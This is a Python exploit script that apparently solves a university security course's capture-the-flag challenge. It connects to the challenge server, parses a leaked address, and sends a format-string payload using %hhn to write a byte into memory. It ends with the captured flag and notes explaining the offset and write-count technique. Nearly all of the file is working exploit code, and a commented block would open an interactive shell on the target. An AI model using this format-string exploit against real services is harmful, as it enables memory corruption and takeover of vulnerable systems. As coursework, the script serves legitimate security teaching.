#!/usr/bin/python2

import struct
from socket import *
import telnetlib
import re

ip = 'secprog.cs.nctu.edu.tw'
port = 10105

soc = socket(AF_INET, SOCK_STREAM)
soc.connect((ip,port))
data = soc.recv(1024)
print(data)

# get address
m = re.search('(0x\S{8})', data)
addr = m.group(0)
print("[+] get ASLR addr = " + addr)

# bruteforce:  {addr} % N $x
# find N = 7
#payload = chr(int(addr[8:10],base=16)) + chr(int(addr[6:8],base=16)) + chr(int(addr[4:6],base=16)) + chr(int(addr[2:4],base=16)) + "%" + str(7) + "$x\n"

# bruteforce:  {addr} % N c % 7 $hhn
# find N = 25
payload = chr(int(addr[8:10],base=16)) + chr(int(addr[6:8],base=16)) + chr(int(addr[4:6],base=16)) + chr(int(addr[2:4],base=16)) + "%" + str(25) + "c%7$hhn\n"


soc.send(payload)
data = soc.recv(1024)
print(data)
print("done")
soc.close()

# SECPROG{1_h0p3_y0u_w1ll_3xcu53_m3}


## get interactive shell
#t = telnetlib.Telnet()
#t.sock = soc
#t.interact()


# % N c M $ hhn
# N: how many chars have already printed on the screen, (plus N) % 256 equals to the content will be written to memory
# M: the offset to the address in the format string


